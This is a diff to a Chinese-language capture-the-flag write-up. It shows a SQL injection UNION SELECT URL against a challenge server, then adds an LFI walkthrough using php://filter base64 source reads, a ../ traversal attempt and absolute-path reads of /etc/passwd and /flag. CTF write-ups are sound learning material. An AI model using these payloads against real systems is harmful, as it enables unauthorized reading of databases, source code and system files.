@@ -33,3 +33,33 @@ f4274506a4c596a76774e,0x717a707671)-- hZDH`
 `http://140.110.112.32:4001/news.php?id=-4031%20UNION%20ALL%20SELECT%201,database(),CONCAT('','',THIS_IS_FLAG_YO) from fl4g.secret-- -`
 
 FLAG就出來了
+
+### easy_lfi
+
+題目url結尾是`?f=about.php`這樣
+
+然後提示LFI了 所以把幾個頁面的source code解出來
+
+`?f=php://filter/read=convert.base64-encode/resource=xd.php`
+
+`?f=php://filter/read=convert.base64-encode/resource=about.php`
+
+`?f=php://filter/read=convert.base64-encode/resource=index.php`
+
+都沒東西 換一個方向
+
+`?f=../../../../../etc/passwd`
+
+出現警告`Oops! ../ will be filtered. You are Bad Hacker!`
+
+所以直接用
+
+`?f=/etc/passwd`
+
+正常顯示
+
+然後隨便猜一下
+
+`?f=/flag`
+
+完工
